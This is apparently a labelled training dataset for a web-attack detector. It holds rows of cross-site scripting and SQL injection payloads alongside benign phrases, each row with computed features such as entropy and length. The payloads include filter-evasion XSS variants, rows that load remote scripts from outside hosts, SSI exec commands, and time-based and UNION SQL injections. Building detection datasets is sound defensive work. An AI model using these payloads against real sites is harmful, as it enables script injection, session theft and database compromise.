input,label,length,entropy,num_quotes,has_script,has_sql_keywords,special_char_ratio
"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",1,59,4.578648185471206,2,0,0,0.3389830451019823
<img src=``&NewLine; onerror=alert(1)&NewLine;,1,46,4.33597085859852,0,0,0,0.23913042958412112
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,58,4.654973451837618,6,0,0,0.36206895927467314
ORDER BY 5--,2,12,3.084962500721156,0,0,0,0.16666665277777895
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",1,173,3.9414070304689397,4,0,0,0.21387283113368305
<script>document.vulnerable=true;</script>,1,42,4.261132303628119,0,1,0,0.1904761859410432
<script>/* *\x2A/javascript:alert(1)// */</script>,1,50,4.32307418942857,0,1,0,0.33999999320000013
"<iframe style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",1,90,4.789448964029215,4,0,0,0.2444444417283951
"&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;",1,71,5.216805838412745,0,0,0,0.5211267532235668
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#",2,101,4.5714391494735835,2,0,1,0.2970297000294089
"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(1)"">DEF",1,64,4.915873781480403,2,0,0,0.20312499682617194
welcome to the site,0,19,3.221097250057957,0,0,0,0.0
"&lt;BASE HREF=\""javascript&#058;alert('XSS');//\""&gt;",1,53,4.892738143119984,4,0,0,0.35849055927376305
"ABC<div style=""x:\x0Bexpression(javascript:alert(1)"">DEF",1,56,4.847097109364437,2,0,0,0.19642856792091845
welcome to the site,0,19,3.221097250057957,0,0,0,0.0
"<img src\x00=x onerror=""javascript:alert(1)"">",1,45,4.552638373963221,2,0,0,0.22222221728395075
<script\x0A>javascript:alert(1)</script>,1,40,4.227567157116929,0,0,0,0.22499999437500015
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,1,50,4.524372820753983,2,0,0,0.4199999916000002
<~/XSS STYLE=xss:expression(alert('XSS'))>,1,42,4.526495328097801,2,0,0,0.2857142789115648
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,1,60,4.631401845392172,2,0,0,0.2999999950000001
"<div style=""binding: url(http://www.securitycompass.com/xss.js);""> [Mozilla]",1,76,4.961211066840679,2,0,0,0.23684210214681445
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://www.securitycompass.com/scriptlet.html""></object>",1,94,4.869146891571729,4,0,0,0.2127659551833409
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",1,42,4.927798970294785,4,0,0,0.3333333253968256
add to cart,0,11,2.7321588913645702,0,0,0,0.0
"<img src=x onerror=\x00""javascript:alert(1)"">",1,45,4.552638373963221,2,0,0,0.22222221728395075
"-eval(window['pro'%2B'mpt'](8)"")-""",1,34,4.440404017720928,6,0,0,0.44117645761245716
"<embed src=""data:text/html;base64,%(base64)s"">",1,46,4.428680913087442,2,0,0,0.2608695595463139
file uploaded successfully,0,26,3.5364142371222305,0,0,0,0.0
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--",2,64,4.458668704467279,2,0,0,0.31249999511718757
"<meta HTTP-EQUIV=""Link"" Content=""<http://www.securitycompass.com/xss.css>; REL=stylesheet"">",1,91,4.946495738719405,4,0,0,0.21978021736505257
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,1,131,4.008203440287082,4,1,0,0.24427480729561216
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",1,125,5.462477060676208,2,0,0,0.23199999814400002
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,86,4.868725953515188,4,1,0,0.30232557787993514
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",1,109,4.630031572245168,0,0,0,0.2568807315882502
OR x=y--,2,8,2.75,0,0,0,0.3749999531250059
upload profile picture,0,22,3.6069367321753214,0,0,0,0.0
HAVING 1=1#,2,11,3.2776134368191157,0,0,0,0.1818181652892577
<a onmouseover=alert(document.cookie)>xxs link</a>,1,50,4.391272380112911,0,0,0,0.17999999640000008
&#x03c;,1,7,2.8073549220576037,0,0,0,0.4285713673469475
<svg><script onlypossibleinopera:-)> alert(1),1,45,4.368979207152324,0,0,0,0.19999999555555567
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,1,85,4.660163842827091,2,0,0,0.34117646657439454
<IMG SRC=javascript:alert('XSS')>,1,33,4.574400937409153,2,0,0,0.2424242350780535
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",1,49,4.195046113312408,2,0,0,0.3061224427321951
"<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.864659425750382,4,0,0,0.22784809838166964
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=javascript:alert(';XSS';);"";>;",1,76,4.965583935727781,6,0,0,0.32894736409279784
"<head><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-",1,139,5.260742009984619,4,0,0,0.22302158112934115
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,1,112,3.2875905006166777,0,0,0,0.12499999888392858
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,112,4.172329343225915,2,0,1,0.2321428550701531
"<embed width=500 height=500 code=""data:text/html,<script>%(payload)s</script>""></embed>",1,87,4.690696691551321,2,1,0,0.24137930757035278
;waitfor delay '0:0:5'--,2,24,4.084962500721156,2,0,0,0.2916666545138894
"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;XSS&lt;/A&gt;",1,58,4.443513753449852,2,0,0,0.3965517173008325
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',1,59,4.572741142325498,2,0,0,0.2711864360815858
OR 1=1,2,6,2.2516291673878226,0,0,1,0.16666663888889352
"<BR SIZE=""&{alert('XSS')}"">",1,27,4.430632409490747,4,0,0,0.44444442798353967
";alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";",1,81,4.45398719421594,2,0,0,0.2839506137783875
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",1,74,4.266376257802435,2,0,0,0.32432431994156324
"<video><source onerror=""javascript:javascript:alert(1)"">",1,56,4.324577021349437,2,0,0,0.19642856792091845
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--",2,124,4.456517252775988,0,0,1,0.2741935461758585
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;,1,49,4.466978600084035,0,0,0,0.3469387684298211
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",2,89,4.2203122393691395,2,0,0,0.30337078310819343
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#",2,62,4.3197130794166405,6,0,1,0.35483870395421446
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1,70,4.760848017776097,0,0,0,0.24285713938775516
"<;SCRIPT a="";>';>""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",1,67,4.580285085657255,5,0,0,0.44776118734684794
";alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search",1,265,5.075167346571854,5,1,0,0.28679245174795304
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;,1,223,2.788000283564213,0,0,0,0.2286995505439482
please login to continue,0,24,3.542481250360578,0,0,0,0.0
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
`'><script>\xE2\x80\x88javascript:alert(1)</script>",1,103,4.553608871755526,2,1,0,0.2718446575549062
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",1,70,4.827946103662097,2,0,0,0.2857142816326531
"<image src=""javascript:alert(1)"">",1,33,4.2942460132322875,2,0,0,0.2424242350780535
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",2,118,4.16352010426853,2,0,0,0.32203389557598394
ORDER BY 27#,2,12,3.2516291673878226,0,0,0,0.08333332638888948
&lt;BODY ONLOAD=alert('XSS')&gt;,1,32,4.327819531114783,2,0,0,0.2812499912109378
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",1,55,4.410740113792766,2,1,0,0.32727272132231416
"\"";document.vulnerable=true;;//",1,31,4.0667842134731025,1,0,0,0.29032257127991706
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",1,55,4.844818349809625,6,0,0,0.25454544991735545
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;,1,86,4.873184668043514,0,0,0,0.23255813683071935
"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",1,70,4.698128595982337,4,0,0,0.21428571122448986
"<? foo=""><script>alert(1)</script>"">",1,36,4.218128820706467,2,1,0,0.3888888780864201
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",1,48,4.252167324657883,2,0,0,0.20833332899305565
"<a href=""\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
"<IMG SRC=x oncut=""alert(String.fromCharCode(88,83,83))"">",1,56,4.874057377298847,2,0,0,0.23214285299744905
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,1,87,4.444871151920139,2,0,0,0.41379309869203335
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,1,79,4.440777306534905,0,0,0,0.1772151876301875
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",1,48,5.0275690110927505,4,0,0,0.2499999947916668
"<IMG SRC=x ondragover=""alert(String.fromCharCode(88,83,83))"">",1,61,4.786894099680635,2,0,0,0.21311475060467622
"<style>li {list-style-image: url(""javascript:document.vulnerable=true;"");</STYLE><UL><LI>XSS",1,92,4.998317185215053,2,0,0,0.23913043218336488
view product details,0,20,3.8219280948873626,0,0,0,0.0
<img src =q onerror=prompt(8)>,1,30,4.002910079649727,0,0,0,0.19999999333333354
<frameset onload=javascript:alert(1)>,1,37,4.347985717495782,0,0,0,0.16216215777940116
"admin"") or ""1""=""1""/*",2,20,3.541446071165522,5,0,0,0.4499999775000011
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",1,114,4.415911109095149,2,0,0,0.31578947091412746
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",1,49,4.598904996955671,2,0,0,0.2653061170345691
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js,1,41,4.570609016654903,0,0,0,0.24390243307555043
user@example.com,0,16,3.577819531114783,0,0,0,0.12499999218750048
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
"&lt;SCRIPT/SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1,80,4.626318838740556,2,0,0,0.37499999531250006
"<img src=x\x11onerror=""javascript:alert(1)"">",1,44,4.481714572986073,2,0,0,0.22727272210743815
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",1,58,4.59273827124388,2,0,0,0.1896551691438764
"<form id=""test"" /><button form=""test"" formaction=""javascript:alert(123)"">TESTHTML5FORMACTION",1,92,5.091086891066119,6,0,0,0.18478260668714558
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5",2,44,4.0666086069294725,6,0,1,0.3181818109504134
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",1,64,4.726813383509937,4,0,0,0.2812499956054688
"<XSS STYLE=""behavior: url(%(htc)s);"">",1,37,4.756618568273181,2,0,0,0.3243243155588023
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.889975881446585,4,0,0,0.22784809838166964
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>,1,85,5.0336768541430255,4,0,0,0.2705882321107267
"<iframe src=""javascript:document.vulnerable=true; <",1,51,4.427642136964358,1,0,0,0.1568627420222992
AND 1083=1083 AND ('1427=1427,2,29,3.728502115742625,1,0,0,0.13793102972651622
<script>javascript:alert(1)<\x00/script>,1,40,4.177567157116929,0,1,0,0.22499999437500015
welcome to the site,0,19,3.221097250057957,0,0,0,0.0
"c=\""javascript&#058;\"";",1,23,4.088779347361361,2,0,0,0.39130433081285515
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",2,62,3.7759641956998915,0,0,1,0.29032257596253913
update account settings,0,23,3.5670402169265785,0,0,1,0.0
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
ORDER BY 6--,2,12,3.084962500721156,0,0,0,0.16666665277777895
<scrscriptipt>alert(1)</scrscriptipt>,1,37,3.608932258902636,0,0,0,0.18918918407596802
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>,1,46,4.490740760310775,0,1,0,0.2608695595463139
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,1,51,4.789689067292008,0,0,0,0.47058822606689754
<script>/* *\x00/javascript:alert(1)// */</script>,1,50,4.28307418942857,0,1,0,0.33999999320000013
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>,1,68,4.776883201856755,0,0,0,0.16176470350346026
"<;A HREF="";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/"";>;XSS<;/A>;",1,66,4.4588607418721775,2,0,0,0.46969696258034904
&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;,1,174,4.801405722668549,0,0,0,0.3390804578213767
"<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">",1,47,5.011827681372809,4,0,0,0.3404255246717974
"<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",1,74,4.266376257802435,2,0,0,0.32432431994156324
"UNION ALL SELECT 1,2,3,4",2,24,3.823934896284056,0,0,1,0.12499999479166687
waitfor delay '00:00:05',2,24,3.7678941476196224,2,0,0,0.1666666597222225
"<input type=""image"" dynsrc=""javascript:document.vulnerable=true;"">",1,66,4.527137066518793,4,0,0,0.18181817906336092
"<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,58,4.633505994978367,5,0,0,0.36206895927467314
ORDER BY 13--,2,13,3.238901256602631,0,0,0,0.15384614201183525
"&lt;STYLE type=\""text/css\""&gt;BODY{background&#58;url(\""javascript&#058;alert('XSS')\"")}&lt;/STYLE&gt;",1,103,5.178507201625432,6,0,0,0.32038834640399666
"</ foo=""><script>javascript:alert(1)</script>"">",1,47,4.309284064167407,2,1,0,0.31914892937981004
<img src=xss onerror=alert(1)>,1,30,4.094739663055176,0,0,0,0.19999999333333354
"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",1,87,4.44890861753227,2,0,0,0.13793103289734446
"<;A HREF="";http://google.com/"";>;XSS<;/A>;",1,42,4.386015934528989,2,0,0,0.4523809416099776
"<link rel=""stylesheet"" href=""javascript:document.vulnerable=true;"">",1,67,4.496944653933763,4,0,0,0.17910447493873918
"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>",1,59,5.475863388344893,0,0,0,0.5423728721631716
"<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;,1,58,4.41359414149279,0,0,0,0.31034482223543414
<script>for((i)in(self))eval(i)(1)</script>,1,43,4.0230392563849495,0,1,0,0.3488372011898325
thank you for your order,0,24,3.418295834054489,0,0,0,0.0
contact support team,0,20,3.4219280948873627,0,0,0,0.0
"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",1,60,4.422964554947562,2,0,0,0.21666666305555562
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",2,54,3.8879848371054426,0,0,1,0.29629629080932796
"<LAYER SRC=""%(scriptlet)s""></LAYER>",1,35,4.47914337402601,2,0,0,0.3142857053061227
"<link REL=""stylesheet"" HREF=""javascript:document.vulnerable=true;"">",1,67,4.75578396744552,4,0,0,0.17910447493873918
"<div STYLE=""background-image: url(&#1;javascript:document.vulnerable=true;)"">",1,77,4.997659600267739,2,0,0,0.20779220509360774
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",1,54,4.76396574282408,4,0,0,0.33333332716049396
"`'><script>\x09javascript:alert(1)</script>
`'><script>\xE2\x80\x89javascript:alert(1)</script>",1,95,4.537659292268194,2,1,0,0.2736842076454294
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,1,47,4.477372032888474,0,0,0,0.40425531054775937
"<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>",1,56,4.126301966925147,6,0,0,0.2678571380739797
));waitfor delay '0:0:5'--,2,26,4.161978179679554,2,0,0,0.3461538328402372
search for latest news,0,22,3.5383105956150063,0,0,0,0.0
"`>ABC<div style=font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF",1,79,5.132523469531776,4,0,0,0.26582278144528126
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",1,76,4.477347331369289,2,0,0,0.4078947314750693
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,58,4.633505994978367,5,0,0,0.36206895927467314
</plaintext\></|\><plaintext/onmouseover=prompt(1),1,50,4.32637013015618,0,0,0,0.2799999944000001
"><h1><IFRAME width=420"" height=""315"" SRC=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",1,154,5.24908856890403,9,0,0,0.22727272579693036
"<form><button formaction=""javascript:alert(XSS)"">lol",1,52,4.5086287863903785,2,0,0,0.19230768860946754
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",2,111,4.168940149424793,2,0,0,0.31531531247463684
"<;IMG SRC="";jav&;#x0A;ascript:alert(';XSS';);"";>;",1,49,4.675136374374234,4,0,0,0.4285714198250731
"admin"" or 1=1--",2,15,3.506890595608519,1,0,1,0.2666666488888901
"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(1)"">DEF",1,64,4.915873781480403,2,0,0,0.20312499682617194
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1,125,3.6133144608635055,0,0,0,0.39199999686400006
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",2,56,4.446983324425746,2,0,0,0.285714280612245
submit your feedback,0,20,3.9219280948873627,0,0,0,0.0
leave a comment,0,15,3.1898980954642875,0,0,0,0.0
reset your password,0,19,3.431623565847431,0,0,0,0.0
"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",1,75,4.4452904452577755,2,0,0,0.1599999978666667
"<a href=""\xE2\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.8393429700541795,4,0,0,0.22784809838166964
AND 1=1#,2,8,2.75,0,0,0,0.24999996875000394
"<BODY BACKGROUND=""javascript:alert('XSS')"">",1,43,4.943592952326203,4,0,0,0.23255813412655504
"<a href=""\x06javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",1,173,3.9414070304689397,4,0,0,0.21387283113368305
<script\x09>javascript:alert(1)</script>,1,40,4.227567157116929,0,0,0,0.22499999437500015
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;,1,50,4.671272380112911,0,0,0,0.23999999520000012
"<img src\x13=x onerror=""javascript:alert(1)"">",1,45,4.552638373963221,2,0,0,0.22222221728395075
perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out,1,103,4.699409505751346,0,0,0,0.3009708708643605
"<IMG SRC=x onabort=""alert(String.fromCharCode(88,83,83))"">",1,58,4.791182667870206,2,0,0,0.22413792717003575
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,187,3.56572300900447,2,0,1,0.2192513357259287
"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",1,84,4.545001614123105,2,0,0,0.1428571411564626
"""""><script language=""JavaScript""> alert('X \nS \nS');</script>",1,62,4.56485815736401,6,0,0,0.29032257596253913
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
"\"";alert('XSS');//",1,18,3.7254805569978675,3,0,0,0.5555555246913597
"&lt;!--#exec cmd=\""/bin/echo '&lt;SCR'\""--&gt;&lt;!--#exec cmd=\""/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\""--&gt;",1,154,4.985426113126745,8,0,0,0.40909090643447465
hello world,0,11,2.8453509366224368,0,0,0,0.0
